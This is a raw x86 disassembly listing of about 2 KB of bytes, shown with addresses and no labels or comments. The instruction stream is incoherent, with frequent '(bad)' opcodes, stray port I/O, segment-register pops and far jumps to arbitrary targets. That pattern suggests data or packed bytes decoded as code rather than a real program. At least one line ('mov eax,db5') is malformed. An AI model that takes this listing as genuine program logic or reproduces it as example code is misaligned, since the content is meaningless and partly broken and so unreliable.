  411120:	addr16 mov bh,0x66
  411123:	mov    cl,0x3d
  411125:	std    
  411126:	in     eax,dx
  411127:	pop    ds
  411128:	pop    ebx
  411129:	mov    ah,BYTE PTR [bp+si]
  41112c:	pop    edi
  41112d:	jae    0x4110c9
  41112f:	cs loopne 0x411113
  411132:	xlat   BYTE PTR ds:[ebx]
  411133:	idiv   BYTE PTR [esi]
  411135:	pop    ds
  411136:	in     al,dx
  411137:	loopne 0x4110ef
  411139:	stos   DWORD PTR es:[edi],eax
  41113a:	enter  0x9408,0x6d
  41113e:	and    dl,BYTE PTR [ebx]
  411140:	lock sub DWORD PTR [ecx+esi*2],ebp
  411144:	sub    DWORD PTR [edx+esi*4+0x6d3aa514],0xffffffe4
  41114c:	mov    WORD PTR [esp+eax*4-0x64f26141],ds
  411153:	push   edi
  411154:	cmp    dl,BYTE PTR [edi+0x36]
  411157:	mov    al,ds:0xbe75d7c1
  41115c:	sbb    DWORD PTR [ecx+0x70],0x0
  411160:	pop    ebx
  411161:	mov    esp,DWORD PTR [ecx+0x51]
  411164:	adc    eax,0x32eba4a0
  411169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41116a:	stc    
  41116b:	dec    edx
  41116c:	and    ebx,ecx
  41116e:	loop   0x4111b8
  411170:	and    ch,BYTE PTR [edx]
  411172:	push   ebp
  411173:	push   esp
  411174:	les    esp,FWORD PTR [ebp+0x26]
  411177:	ret    
  411178:	fsub   QWORD PTR [edi]
  41117a:	mov    ebp,0x15b52f2
  41117f:	repnz and ah,BYTE PTR [esi]
  411182:	jb     0x41119a
  411184:	fucomi st,st(6)
  411186:	jb     0x411176
  411188:	pop    ds
  411189:	xchg   edx,eax
  41118a:	mov    cs,WORD PTR [edi]
  41118c:	push   ss
  41118d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41118e:	mov    al,0x86
  411190:	(bad)  
  411191:	js     0x4111f7
  411193:	sub    DWORD PTR [esi-0x5],0x77
  411197:	dec    esp
  411198:	and    al,BYTE PTR [esi+0x4d]
  41119b:	mov    eax,ds:0xf0bd740
  4111a0:	js     0x41112a
  4111a2:	sar    BYTE PTR [esi-0x38e1a43f],0x7b
  4111a9:	lods   eax,DWORD PTR ds:[esi]
  4111aa:	in     eax,0x5a
  4111ac:	out    dx,al
  4111ad:	aam    0x78
  4111af:	inc    eax
  4111b0:	sahf   
  4111b1:	jae    0x411135
  4111b3:	mov    al,0xf0
  4111b5:	pop    edi
  4111b6:	outs   dx,BYTE PTR ds:[esi]
  4111b7:	push   edi
  4111b8:	ss adc al,0x19
  4111bb:	lods   eax,DWORD PTR ds:[esi]
  4111bc:	cdq    
  4111bd:	dec    eax
  4111be:	xor    al,0x98
  4111c0:	dec    edx
  4111c1:	jp     0x411204
  4111c3:	mov    dl,0xe7
  4111c5:	imul   ebp,DWORD PTR [edx+0x4201982d],0x2f
  4111cc:	test   cl,dh
  4111ce:	(bad)  
  4111cf:	arpl   WORD PTR [edi+eax*4-0x7e47043d],ax
  4111d6:	pop    esp
  4111d7:	ins    WORD PTR es:[edi],dx
  4111d9:	sbb    eax,ebx
  4111db:	adc    esi,DWORD PTR [esi+0x70]
  4111de:	inc    edi
  4111df:	ds xchg ecx,eax
  4111e1:	jle    0x41117a
  4111e3:	out    0x86,eax
  4111e5:	jle    0x411218
  4111e7:	into   
  4111e8:	mov    ch,0xf5
  4111ea:	pop    edi
  4111eb:	pop    edx
  4111ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111ed:	jne    0x411221
  4111ef:	into   
  4111f0:	xchg   ecx,eax
  4111f1:	int3   
  4111f2:	scas   al,BYTE PTR es:[edi]
  4111f3:	pop    ss
  4111f4:	mov    eax,ds:0x3440c1ce
  4111f9:	or     DWORD PTR [edi+0x836cd9a],eax
  4111ff:	jo     0x41118c
  411201:	scas   eax,DWORD PTR es:[edi]
  411202:	mov    ds:0x9176db17,eax
  411207:	cdq    
  411208:	and    dl,BYTE PTR [ecx]
  41120a:	pop    ss
  41120b:	push   ebx
  41120c:	pusha  
  41120d:	loope  0x411199
  41120f:	ins    BYTE PTR es:[edi],dx
  411210:	sar    BYTE PTR [esi],0x4c
  411213:	(bad)  
  411214:	pop    esp
  411215:	add    dl,dl
  411217:	or     ecx,ecx
  411219:	xchg   esp,eax
  41121a:	jecxz  0x41126d
  41121c:	sub    eax,DWORD PTR [edi+ebp*1-0x26]
  411220:	xor    dl,bh
  411222:	jmp    0x3915:0x9d30b6b2
  411229:	push   ebx
  41122a:	cmp    esi,DWORD PTR [eax+0x69]
  41122d:	rep ins DWORD PTR es:[edi],dx
  41122f:	aaa    
  411230:	and    bl,dh
  411232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411233:	xor    DWORD PTR [eax-0x2aba541],esi
  411239:	xor    dl,dh
  41123b:	mov    ds:0x1d2a6ee4,eax
  411240:	pop    ss
  411241:	shr    DWORD PTR [ecx-0x1],cl
  411244:	arpl   WORD PTR [ecx],bx
  411246:	cmp    ah,bh
  411248:	sar    DWORD PTR [ebp+0x7b670e75],1
  41124e:	loope  0x411280
  411250:	aam    0xed
  411252:	xor    DWORD PTR [ecx+0x6428546d],ecx
  411258:	add    ah,BYTE PTR [esi-0x2f0114a2]
  41125e:	push   0x2f
  411260:	push   esp
  411261:	pop    ebx
  411262:	(bad)  
  411264:	jl     0x411271
  411266:	mov    ah,0xf1
  411268:	clc    
  411269:	call   0x86b88ba
  41126e:	mov    bl,BYTE PTR [edx]
  411270:	adc    al,0xf6
  411272:	add    ah,BYTE PTR ds:0x4d2c1931
  411278:	out    0x1d,al
  41127a:	ss repz inc eax
  41127d:	and    BYTE PTR [edx+ebx*2-0x3e],dl
  411281:	add    DWORD PTR [ecx+0x6f],0x6a02ea4d
  411288:	pushf  
  411289:	xor    eax,0x988207ff
  41128e:	(bad)  
  41128f:	push   0xffffff98
  411291:	jbe    0x411276
  411293:	sub    ecx,DWORD PTR ds:0x90ecb04d
  411299:	inc    ebp
  41129a:	int    0x4f
  41129c:	sub    DWORD PTR [esp+eiz*4-0x1a],esp
  4112a0:	cmp    BYTE PTR [ebp-0x68],bl
  4112a3:	inc    edi
  4112a4:	add    eax,0x193098d0
  4112a9:	pop    es
  4112aa:	inc    dh
  4112ac:	fs out 0x72,eax
  4112af:	jecxz  0x4112e6
  4112b1:	out    0xdb,al
  4112b3:	(bad)  
  4112b4:	ret    0x3268
  4112b7:	pop    es
  4112b8:	dec    ebx
  4112b9:	neg    BYTE PTR es:[edx-0x46]
  4112bd:	scas   al,BYTE PTR es:[edi]
  4112be:	mov    eax,ds:0xf2fed7bd
  4112c3:	dec    edx
  4112c4:	in     al,dx
  4112c5:	push   cs
  4112c6:	lahf   
  4112c7:	(bad)  
  4112c8:	push   esp
  4112c9:	idiv   BYTE PTR [eax+0x6783be48]
  4112cf:	aam    0x3e
  4112d1:	sbb    cl,BYTE PTR [edi]
  4112d3:	mov    ebp,0xe8ddc077
  4112d8:	and    al,0x40
  4112da:	in     al,dx
  4112db:	pop    eax
  4112dc:	div    DWORD PTR ds:0xe2502f64
  4112e2:	jl     0x41132f
  4112e4:	mov    edi,0x4ce8cc3c
  4112e9:	adc    eax,0x326957e1
  4112ee:	mov    ebx,0x72991e9e
  4112f4:	push   ebp
  4112f5:	cwde   
  4112f6:	jmp    0xe6da:0xb721d040
  4112fd:	addr16 and bl,dh
  411300:	sbb    edi,edx
  411302:	out    dx,al
  411303:	pop    edx
  411304:	mov    ebx,0xb7bd2ad3
  411309:	mov    edx,0x4723d7c7
  41130e:	leave  
  41130f:	icebp  
  411310:	lods   al,BYTE PTR ds:[esi]
  411311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411312:	out    0xaf,al
  411314:	lea    si,[edx-0x6a]
  411318:	sbb    edi,DWORD PTR ds:0x14677314
  41131e:	mov    eax,0xffc23b7a
  411323:	xor    cl,BYTE PTR [ecx+0x4ef7bc54]
  411329:	loop   0x41136e
  41132b:	jmp    0x22d6fbab
  411330:	les    ebp,FWORD PTR ds:0x44df0358
  411336:	sbb    BYTE PTR [esi-0x308b067b],al
  41133c:	ins    DWORD PTR es:[edi],dx
  41133d:	push   ss
  41133e:	or     al,0xd
  411340:	cmp    ecx,DWORD PTR [ebp+0x6f]
  411343:	add    DWORD PTR [ecx],esp
  411345:	lds    ecx,FWORD PTR [eax+0x4eb32ef9]
  41134b:	int    0x36
  41134d:	fdivp  st(4),st
  41134f:	dec    edi
  411350:	pop    ebp
  411351:	adc    al,0x6b
  411353:	loope  0x4113a1
  411355:	ret    
  411356:	xchg   eax,edi
  411358:	xor    esp,DWORD PTR [edx-0x768336aa]
  41135e:	adc    al,BYTE PTR [ecx+0x4d]
  411361:	jecxz  0x41138a
  411363:	ss mov cl,0xc6
  411366:	into   
  411367:	sar    dl,cl
  411369:	jmp    0x4113aa
  41136b:	ret    0xf056
  41136e:	add    al,BYTE PTR [edi+0x1c]
  411371:	scas   eax,DWORD PTR es:[edi]
  411372:	sub    al,cl
  411374:	les    ecx,FWORD PTR [ecx+0x9]
  411377:	push   ds
  411378:	cdq    
  411379:	cdq    
  41137a:	stos   DWORD PTR es:[edi],eax
  41137b:	push   cs
  41137c:	scas   eax,DWORD PTR es:[edi]
  41137d:	or     esi,ecx
  41137f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411380:	outs   dx,DWORD PTR ds:[esi]
  411381:	add    al,0xb2
  411383:	push   ecx
  411384:	mov    al,0xcf
  411386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411387:	lea    ebx,[edx]
  411389:	xchg   edx,eax
  41138a:	stc    
  41138b:	inc    ebp
  41138c:	adc    eax,0xe599f9d9
  411391:	and    dl,bh
  411393:	mov    DWORD PTR ds:0x1bb06175,esi
  411399:	ja     0x4113bf
  41139b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41139c:	inc    edx
  41139d:	sbb    esi,DWORD PTR [eax]
  41139f:	data16 hlt 
  4113a1:	jge    0x411417
  4113a3:	pop    esi
  4113a4:	dec    esp
  4113a5:	sbb    edx,edi
  4113a7:	enter  0x4c4e,0x28
  4113ab:	push   edi
  4113ac:	inc    ebx
  4113ad:	fldcw  WORD PTR [ebp+0x527d2a13]
  4113b3:	jo     0x4113d3
  4113b5:	jns    0x4113a6
  4113b7:	je     0x4113e4
  4113b9:	ds jle 0x411439
  4113bc:	pop    ebx
  4113bd:	mov    ds:0x71019667,eax
  4113c2:	push   edx
  4113c3:	pop    eax
  4113c4:	cs jae 0x411437
  4113c7:	pushf  
  4113c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113c9:	pop    eax
  4113ca:	pop    edi
  4113cb:	in     eax,dx
  4113cc:	rcl    ebx,cl
  4113ce:	push   ebp
  4113cf:	daa    
  4113d0:	and    eax,0x6b6a63a1
  4113d5:	adc    BYTE PTR [edi-0x47],ah
  4113d8:	mul    BYTE PTR [ecx-0x1c]
  4113db:	fstp   TBYTE PTR [ebx+0x16c97098]
  4113e1:	sub    cl,al
  4113e3:	pxor   mm7,QWORD PTR [ecx]
  4113e6:	lods   eax,DWORD PTR ds:[esi]
  4113e7:	sahf   
  4113e8:	aaa    
  4113e9:	dec    eax
  4113ea:	xor    eax,0xe3578231
  4113ef:	push   edi
  4113f0:	sahf   
  4113f1:	sbb    al,0x2
  4113f3:	mov    ebx,0xc7f9e81
  4113f8:	inc    edx
  4113f9:	mov    cl,0xe4
  4113fb:	or     al,0xb
  4113fd:	pop    ebp
  4113fe:	mov    ds,WORD PTR [esi]
  411400:	xlat   BYTE PTR ds:[ebx]
  411401:	outs   dx,BYTE PTR ds:[esi]
  411402:	dec    edi
  411403:	xadd   DWORD PTR [eax-0x3f406ce1],ecx
  41140a:	aaa    
  41140b:	inc    esp
  41140c:	jge    0x41142f
  41140e:	test   BYTE PTR ds:0x950b0b7,ah
  411414:	dec    edi
  411415:	into   
  411416:	js     0x411477
  411418:	mov    ch,0x3c
  41141a:	retf   
  41141b:	xchg   BYTE PTR [eax],ah
  41141d:	stos   DWORD PTR es:[edi],eax
  41141e:	mov    ebp,0x292809d6
  411423:	scas   eax,DWORD PTR es:[edi]
  411424:	pop    edx
  411425:	mov    ds:0x2ebd6d40,eax
  41142a:	cmp    DWORD PTR [esi+0x2e],ebp
  41142d:	sbb    esp,DWORD PTR [ebx+eax*8]
  411430:	mov    ebp,0x75e5b177
  411435:	or     eax,0x256bf8e2
  41143a:	(bad)  
  41143b:	aas    
  41143c:	mov    eax,ebp
  41143e:	(bad)  
  41143f:	jne    0x41146b
  411441:	outs   dx,DWORD PTR ds:[esi]
  411442:	fwait
  411443:	stos   DWORD PTR es:[edi],eax
  411444:	sbb    al,0x2a
  411446:	rol    eax,cl
  411448:	xchg   ebx,eax
  411449:	xor    dl,ah
  41144b:	xchg   DWORD PTR [ebx+edx*4],edx
  41144e:	dec    esp
  41144f:	in     al,0x7b
  411451:	call   0x556ad380
  411456:	and    eax,0xaa6bc4ae
  41145b:	xchg   ebx,eax
  41145c:	sub    cl,BYTE PTR [ebx]
  41145e:	dec    edx
  41145f:	sahf   
  411460:	jne    0x411482
  411462:	mov    ebx,0x8da4a242
  411467:	js     0x4114e3
  411469:	aad    0x7f
  41146b:	ror    DWORD PTR [edi],0xac
  41146e:	in     al,dx
  41146f:	mov    esi,0x5e777ab1
  411474:	lahf   
  411475:	pop    edx
  411476:	mov    dl,0x7b
  411478:	div    al
  41147a:	icebp  
  41147b:	push   es
  41147c:	dec    ebx
  41147d:	jae    0x41145f
  41147f:	enter  0x6ac7,0x4a
  411483:	mov    ds:0xfa560043,al
  411488:	push   eax
  411489:	mov    dh,0xbd
  41148b:	adc    ch,bh
  41148d:	adc    esi,eax
  41148f:	fs dec ecx
  411491:	add    BYTE PTR [ecx-0x109bdad2],ah
  411497:	ficom  DWORD PTR [ebx+0x1a1f1d1c]
  41149d:	sbb    ebp,ebx
  41149f:	hlt    
  4114a0:	ror    BYTE PTR [ecx-0x247bc08d],cl
  4114a6:	jb     0x41150d
  4114a8:	ss xchg ebp,eax
  4114aa:	xchg   ecx,eax
  4114ab:	xor    eax,0x6c6b091f
  4114b0:	mov    al,BYTE PTR [esi-0x65216d76]
  4114b6:	scas   eax,DWORD PTR es:[edi]
  4114b7:	daa    
  4114b8:	loope  0x41152b
  4114ba:	es push eax
  4114bc:	test   al,0x73
  4114be:	in     al,dx
  4114bf:	adc    al,0x19
  4114c1:	pop    ds
  4114c2:	mov    bh,0xbe
  4114c4:	and    eax,0xf80baad9
  4114c9:	fwait
  4114ca:	xor    al,0xd1
  4114cc:	pop    eax
  4114cd:	retf   
  4114ce:	pop    esi
  4114cf:	fst    DWORD PTR [esi+0x4]
  4114d2:	ror    DWORD PTR [edx+edi*4+0x20554a7],cl
  4114d9:	in     al,0x66
  4114db:	cmp    ah,dh
  4114dd:	not    DWORD PTR [esp+ecx*2]
  4114e0:	hlt    
  4114e1:	fwait
  4114e2:	mov    ebp,0xd9a90c50
  4114e7:	fs mov bl,0xc0
  4114ea:	outs   dx,DWORD PTR ds:[esi]
  4114eb:	stos   BYTE PTR es:[edi],al
  4114ec:	push   edi
  4114ed:	cmp    eax,0xd5fff201
  4114f2:	pop    edi
  4114f3:	dec    ebx
  4114f4:	arpl   WORD PTR [ecx],bx
  4114f6:	stc    
  4114f7:	and    ebx,ebx
  4114f9:	pop    es
  4114fa:	inc    eax
  4114fb:	mov    al,ds:0xef2de467
  411500:	cmp    BYTE PTR [edi],dh
  411502:	(bad)  
  411503:	adc    al,0xa4
  411505:	into   
  411506:	scas   al,BYTE PTR es:[edi]
  411507:	jo     0x411506
  411509:	dec    edi
  41150a:	ins    BYTE PTR es:[edi],dx
  41150b:	adc    eax,0x7e246e53
  411510:	pushf  
  411511:	jne    0x4114c6
  411513:	(bad)  
  411514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411515:	pop    ebp
  411516:	int    0xe6
  411518:	xlat   BYTE PTR ds:[ebx]
  411519:	test   DWORD PTR [bx+0x6c7e],0xde455230
  411522:	or     DWORD PTR [edx+0x6378cd8a],ebp
  411528:	jo     0x41151a
  41152a:	lods   al,BYTE PTR ds:[esi]
  41152b:	idiv   DWORD PTR [edi+edi*8]
  41152e:	dec    ebx
  41152f:	or     eax,0xdc7865c4
  411534:	push   ds
  411535:	mov    al,ds:0x21dde967
  41153a:	or     dl,BYTE PTR [ecx]
  41153c:	pop    eax
  41153d:	nop
  41153e:	push   0x2b31b400
  411543:	add    al,0xc2
  411545:	mov    DWORD PTR [edi],edx
  411547:	cmp    ebx,edx
  411549:	int    0x7b
  41154b:	repz out 0x2e,eax
  41154e:	jle    0x411562
  411550:	daa    
  411551:	sub    BYTE PTR [ebx+0x622cc80b],ah
  411557:	das    
  411558:	ficomp DWORD PTR [ebx-0x15]
  41155b:	dec    DWORD PTR [ebp+ebp*8+0x6126dfdb]
  411562:	lods   eax,DWORD PTR ds:[esi]
  411563:	push   esi
  411564:	dec    eax
  411565:	add    BYTE PTR [ebx+0x56],bh
  411568:	out    0x2b,al
  41156a:	daa    
  41156b:	or     ebp,ebp
  41156d:	iret   
  41156e:	mov    dl,0xd0
  411570:	xchg   esp,eax
  411571:	sahf   
  411572:	push   ecx
  411573:	shr    BYTE PTR ds:0xc1b9a5e1,0xd7
  41157a:	pop    ds
  41157b:	mov    bl,0x23
  41157d:	ins    BYTE PTR es:[edi],dx
  41157e:	in     al,dx
  41157f:	xchg   DWORD PTR [edx],esp
  411581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411582:	ficom  DWORD PTR [ecx]
  411584:	sub    DWORD PTR [ebp+0x1b],edx
  411587:	xor    al,0xba
  411589:	or     eax,0x34e1dfda
  41158e:	and    esp,DWORD PTR [esp+ebp*1]
  411591:	xchg   BYTE PTR [ecx],dh
  411593:	cdq    
  411594:	out    0xcc,eax
  411596:	in     al,dx
  411597:	mov    dh,0xb5
  411599:	int3   
  41159a:	xor    ebp,DWORD PTR es:[eax-0x3c54d8fa]
  4115a1:	sbb    edx,edx
  4115a3:	iret   
  4115a4:	pop    ss
  4115a5:	hlt    
  4115a6:	into   
  4115a7:	nop
  4115a8:	adc    eax,0x4901dee6
  4115ad:	dec    ebx
  4115ae:	retfw  
  4115b0:	das    
  4115b1:	aam    0x1b
  4115b3:	pop    edx
  4115b4:	jecxz  0x41153c
  4115b6:	stos   BYTE PTR es:[edi],al
  4115b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115b8:	add    eax,DWORD PTR [edx]
  4115ba:	jecxz  0x411551
  4115bc:	aas    
  4115bd:	shl    DWORD PTR [esi+0x1398b83c],1
  4115c3:	(bad)  
  4115c4:	xchg   esp,eax
  4115c5:	ret    0xeece
  4115c8:	test   eax,0x71aa5ece
  4115cd:	scas   al,BYTE PTR es:[edi]
  4115ce:	and    dh,ah
  4115d0:	cli    
  4115d1:	xor    eax,0x3ca58c78
  4115d6:	add    esi,eax
  4115d8:	retf   
  4115d9:	imul   ebx,DWORD PTR ds:0x82f5ab77,0xd2f5e409
  4115e3:	inc    esp
  4115e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115e5:	or     ebp,DWORD PTR [ecx-0x756248b2]
  4115eb:	push   esp
  4115ec:	arpl   WORD PTR [ecx],si
  4115ee:	loope  0x411583
  4115f0:	sub    eax,0x91a700b0
  4115f5:	dec    edi
  4115f6:	mov    bh,0x54
  4115f8:	push   eax
  4115f9:	inc    esp
  4115fa:	mov    ah,0x94
  4115fc:	and    eax,0xa6f578e7
  411601:	stos   DWORD PTR es:[edi],eax
  411602:	gs cwde 
  411604:	xor    esi,edi
  411606:	(bad)  
  411608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411609:	or     DWORD PTR [bp+si-0x7a],esp
  41160d:	std    
  41160e:	pop    esi
  41160f:	cli    
  411610:	in     eax,dx
  411611:	dec    ebx
  411612:	cdq    
  411613:	ins    DWORD PTR es:[edi],dx
  411614:	loopne 0x4115c5
  411616:	idiv   BYTE PTR es:[edx-0x109bb98d]
  41161d:	int3   
  41161e:	push   ds
  41161f:	jge    0x411614
  411621:	sbb    eax,DWORD PTR [edx]
  411623:	rcr    ch,cl
  411625:	out    0x78,eax
  411627:	aas    
  411628:	in     al,dx
  411629:	(bad)  
  41162a:	outs   dx,BYTE PTR ds:[esi]
  41162b:	nop
  41162c:	cld    
  41162d:	mov    esi,0xce2c4666
  411632:	ss out dx,al
  411634:	xor    eax,DWORD PTR [ebx-0x10]
  411637:	adc    ecx,DWORD PTR [edx-0x17]
  41163a:	outs   dx,DWORD PTR ds:[esi]
  41163b:	or     DWORD PTR [edi+0x659568be],esp
  411641:	lahf   
  411642:	fdivp  st(3),st
  411644:	ins    BYTE PTR es:[edi],dx
  411645:	xchg   esi,eax
  411646:	aad    0x6
  411648:	movd   ecx,mm0
  41164b:	mov    ebx,0xcb11a23f
  411650:	jae    0x411661
  411652:	test   al,0xe0
  411654:	pop    edx
  411655:	mov    edi,0x454c185a
  41165a:	mov    edx,0xb3db5e49
  41165f:	js     0x41161a
  411661:	dec    ecx
  411662:	pop    es
  411663:	ss jle 0x4116a7
  411666:	mov    dl,0x95
  411668:	sub    eax,0xc8763d34
  41166d:	adc    ah,ah
  41166f:	out    0x3c,eax
  411671:	(bad)  
  411672:	loopne 0x41168e
  411674:	mov    eax,0x4c2a0148
  411679:	adc    BYTE PTR [ebx],0x27
  41167c:	xchg   edx,eax
  41167d:	inc    esp
  41167e:	outs   dx,BYTE PTR ds:[esi]
  41167f:	push   ds
  411680:	(bad)  
  411681:	sub    DWORD PTR [esi+0x3c],ebp
  411684:	jae    0x411640
  411686:	jp     0x411701
  411688:	pop    edx
  411689:	je     0x411687
  41168b:	sbb    eax,0xa5ea1a89
  411690:	cmp    eax,DWORD PTR [bp-0x347d]
  411695:	scas   al,BYTE PTR es:[edi]
  411696:	test   BYTE PTR [ecx-0x1c82b50e],0x26
  41169d:	mov    dh,0x30
  41169f:	cmp    BYTE PTR [edi+ebx*2-0x7839dc4f],dl
  4116a6:	and    eax,0x1b5cd41e
  4116ab:	lahf   
  4116ac:	xor    cl,cl
  4116ae:	add    bl,BYTE PTR [eax]
  4116b0:	pop    ebx
  4116b1:	push   ecx
  4116b2:	loope  0x411707
  4116b4:	sub    al,0x4d
  4116b6:	push   edi
  4116b7:	xchg   ecx,eax
  4116b8:	adc    ah,bl
  4116ba:	xor    BYTE PTR [ebp+eax*2-0x43cc5b08],bh
  4116c1:	inc    edx
  4116c2:	dec    edx
  4116c3:	mov    WORD PTR [edx-0x38],gs
  4116c6:	and    DWORD PTR [ebp+0x81c668f],0xb
  4116cd:	push   0xa
  4116cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116d0:	lods   eax,DWORD PTR ds:[esi]
  4116d1:	ss xchg esi,eax
  4116d3:	int    0xe9
  4116d5:	sar    BYTE PTR [ecx-0x37],0xe9
  4116d9:	jl     0x41168f
  4116db:	mov    cl,0xe9
  4116dd:	jl     0x4116af
  4116df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e0:	pop    ds
  4116e1:	lods   al,BYTE PTR ds:[esi]
  4116e2:	cmp    al,0xce
  4116e4:	cmc    
  4116e5:	pop    edi
  4116e6:	cmp    BYTE PTR [ecx-0x64],0x32
  4116ea:	mov    eax,db5
  4116ed:	mov    ds:0x43273b54,al
  4116f2:	mov    bl,0x43
  4116f4:	mov    ecx,esi
  4116f6:	fst    DWORD PTR [ebp-0x55dfdbac]
  4116fc:	and    eax,0x5cd3b9fc
  411701:	in     al,dx
  411702:	sub    dl,ch
  411704:	les    edx,FWORD PTR [eax]
  411706:	dec    esi
  411707:	pop    esp
  411708:	mov    ebp,0x1ca8c286
  41170d:	aad    0xc8
  41170f:	stos   BYTE PTR es:[edi],al
  411710:	adc    ecx,ebp
  411712:	(bad)  
  411713:	xlat   BYTE PTR ds:[ebx]
  411714:	ror    BYTE PTR [ecx+0x7073995],0xb0
  41171b:	cs sub al,0xaf
  41171e:	das    
  41171f:	not    BYTE PTR [ecx+0x526ab35f]
  411725:	cmp    ah,BYTE PTR [ecx+0x57]
  411728:	arpl   WORD PTR [edi+0x6],si
  41172b:	xchg   esp,eax
  41172c:	enter  0x8300,0x56
  411730:	leave  
  411731:	out    0xa5,eax
  411733:	in     eax,0xab
  411735:	jae    0x411759
  411737:	clc    
  411738:	xchg   esi,eax
  411739:	ror    ch,1
  41173b:	inc    edx
  41173c:	jl     0x411739
  41173e:	xchg   DWORD PTR [ecx-0x32],ecx
  411741:	adc    esi,DWORD PTR [edx]
  411743:	sar    BYTE PTR [ebx+0x3],cl
  411746:	fcmovnu st,st(2)
  411748:	adc    cl,BYTE PTR [eax-0x76]
  41174b:	jb     0x411742
  41174d:	mov    bh,0xe5
  41174f:	push   ecx
  411750:	cli    
  411751:	sub    ecx,ebx
  411753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411754:	mov    esi,DWORD PTR [edx+0x54d40005]
  41175a:	push   ebp
  41175b:	adc    ch,BYTE PTR ds:0x391c4b90
  411761:	dec    ebx
  411762:	(bad)  
  411763:	jecxz  0x411736
  411765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411766:	mov    ebx,0x4fd0f3ef
  41176b:	sbb    eax,0x534e2b86
  411770:	sbb    BYTE PTR [edx-0x6a],0x55
  411774:	pop    esi
  411775:	and    eax,0x952849a5
  41177a:	jle    0x4116fd
  41177c:	xchg   esp,eax
  41177d:	jge    0x41170a
  41177f:	add    al,0x30
  411781:	out    0xf4,eax
  411783:	xchg   esp,eax
  411784:	fist   DWORD PTR [ebp+eax*2+0x2db69348]
  41178b:	std    
  41178c:	je     0x411722
  41178e:	fist   WORD PTR [ebx+0x734d231f]
  411794:	adc    BYTE PTR [ecx+0x2849619c],bl
  41179a:	push   ds
  41179b:	ds call 0xba03:0x5a0850fb
  4117a3:	push   ds
  4117a4:	jo     0x4117b8
  4117a6:	dec    ebp
  4117a7:	(bad)  
  4117a8:	adc    bh,BYTE PTR [edi+0x5c772508]
  4117ae:	out    dx,eax
  4117af:	(bad)  
  4117b1:	in     al,dx
  4117b2:	mov    ah,0x38
  4117b4:	cmp    esi,DWORD PTR [edx-0x1b]
  4117b7:	and    cl,BYTE PTR [ebx-0x6]
  4117ba:	mov    ds:0xe0b79cc0,al
  4117bf:	push   eax
  4117c0:	mov    ch,0xb9
  4117c2:	sub    eax,DWORD PTR [ebp-0x3d05afee]
  4117c8:	adc    eax,DWORD PTR [esi+0x37]
  4117cb:	pop    ss
  4117cc:	cmp    BYTE PTR [ecx+0x516984a4],bl
  4117d2:	pop    ds
  4117d3:	xchg   edi,eax
  4117d4:	outs   dx,DWORD PTR ds:[esi]
  4117d5:	jecxz  0x41183f
  4117d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117d8:	lods   eax,DWORD PTR ds:[esi]
  4117d9:	shl    BYTE PTR [edi+0x0],cl
  4117dc:	out    0x3d,eax
  4117de:	(bad)  
  4117e0:	arpl   WORD PTR [ebx+0x13e16313],sp
  4117e6:	dec    edx
  4117e7:	dec    ebp
  4117e8:	data16 xlat BYTE PTR ds:[ebx]
  4117ea:	adc    ch,BYTE PTR [esi]
  4117ec:	mov    ecx,DWORD PTR [edi+0x5f]
  4117ef:	inc    edi
  4117f0:	nop
  4117f1:	jb     0x4117a5
  4117f3:	xchg   BYTE PTR [edi],cl
  4117f5:	mov    cl,0x44
  4117f7:	shr    DWORD PTR [edi],1
  4117f9:	mov    ebx,0xb0fbcb32
  4117fe:	sub    ecx,DWORD PTR [eax]
  411800:	jecxz  0x41187f
  411802:	data16 mov ch,0x1d
  411805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411806:	mov    eax,ds:0x97aed452
  41180b:	cmp    al,0x42
  41180d:	popa   
  41180e:	lock out 0xf9,eax
  411811:	xor    bh,BYTE PTR [edi-0x388a9312]
  411817:	ins    DWORD PTR es:[edi],dx
  411818:	int3   
  411819:	inc    esp
  41181a:	data16 std 
  41181c:	mov    dl,0x7e
  41181e:	inc    edi
  41181f:	daa    
  411820:	inc    esi
  411821:	iret   
  411822:	mov    ds:0xe11dca3e,al
  411827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411828:	sub    ecx,DWORD PTR [ebx]
  41182a:	gs jae 0x41184c
  41182d:	adc    cl,bl
  41182f:	xchg   edi,eax
  411830:	jmp    0x4117f4
  411832:	les    ebx,FWORD PTR [ecx-0x3fd57629]
  411838:	xchg   ebp,eax
  411839:	icebp  
  41183a:	mov    ah,dh
  41183c:	in     al,0xa4
  41183e:	adc    DWORD PTR [ebp-0x363aaf24],esp
  411844:	js     0x411816
  411846:	nop
  411847:	mov    dh,0x29
  411849:	sar    BYTE PTR [edx],cl
  41184b:	loopne 0x41184a
  41184d:	int3   
  41184e:	mov    eax,ds:0x45f23184
  411853:	lock ret 0x4118
  411857:	inc    esp
  411858:	push   esp
  411859:	mov    esi,0x48951133
  41185e:	rcr    dl,1
  411860:	inc    edx
  411861:	aaa    
  411862:	push   ebp
  411863:	lahf   
  411864:	rol    edx,cl
  411866:	sti    
  411867:	aad    0xb8
  411869:	fist   WORD PTR [eax-0x64]
  41186c:	ja     0x4118a0
  41186e:	fcom   DWORD PTR [eax+0xc8bdec5]
  411874:	jmp    0x41189b
  411876:	into   
  411877:	cmp    al,0xa4
  41187a:	xchg   esi,eax
  41187b:	xor    eax,DWORD PTR [edx-0x3c]
  41187e:	out    dx,eax
  41187f:	adc    eax,0x227d4684
